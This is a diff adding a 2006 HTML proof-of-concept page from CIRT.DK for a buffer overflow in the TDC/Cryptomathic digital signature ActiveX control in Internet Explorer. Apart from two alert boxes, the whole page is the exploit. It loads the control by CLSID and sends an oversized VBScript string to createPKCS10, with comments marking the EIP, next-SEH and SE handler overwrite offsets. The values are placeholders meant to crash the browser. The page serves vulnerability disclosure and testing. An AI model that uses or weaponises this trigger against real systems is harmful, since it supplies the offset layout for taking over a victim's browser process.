@@ -1,0 +1,31 @@
+&lt;html&gt;
+ &lt;head&gt;
+    &lt;title&gt;CIRT.DK - Cryptomathic ActiveX Buffer Overflow&lt;/title&gt;
+    &lt;IMG SRC=&quot;http://www.cirt.dk/images/logo.jpg&quot;&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+   &lt;center&gt;
+      &lt;h1&gt;TDC Digital Signature ActiveX Buffer Overflow&lt;/h1&gt;
+
+   	  &lt;h4&gt; (c)2006 by Dennis Rand - CIRT.DK&lt;/h4&gt;
+  	   
+      The following Proof-of-Concept will make Internet Explorer shutdown, if you are vulnerable.&lt;br&gt;
+   &lt;/center&gt;
+   &lt;br&gt;
+   &lt;script&gt;alert(&#039;Press &quot;OK&quot; to see if you are vulnerable&#039;)&lt;/script&gt;   
+   &lt;object classid=&#039;clsid:6DA9275C-64E5-42A1-879C-D90B5F0DC5B4&#039; id=&#039;target&#039; &gt;&lt;/object&gt;
+   &lt;script language=&#039;vbscript&#039;&gt;
+      arg1 = String(8, &quot;A&quot;)
+      arg1 = arg1 + &quot;ABCD&quot; 						&#039; EIP is overwritten here
+      arg1 = arg1 + String(64, &quot;B&quot;)
+      arg1 = arg1 + &quot;AABB&quot;						  &#039; Pointer to the next SEH Handler
+      arg1 = arg1 + &quot;BBAA&quot; 						&#039; SE Handler
+      arg1 = arg1 + String(700, &quot;C&quot;)
+      arg2 = &quot;DefaultV&quot;
+
+      target.createPKCS10 arg1 ,arg2
+   &lt;/script&gt;
+
+   &lt;script&gt;alert(&#039;You are secure&#039;)&lt;/script&gt;   
+ &lt;/body&gt;
+&lt;/html&gt;
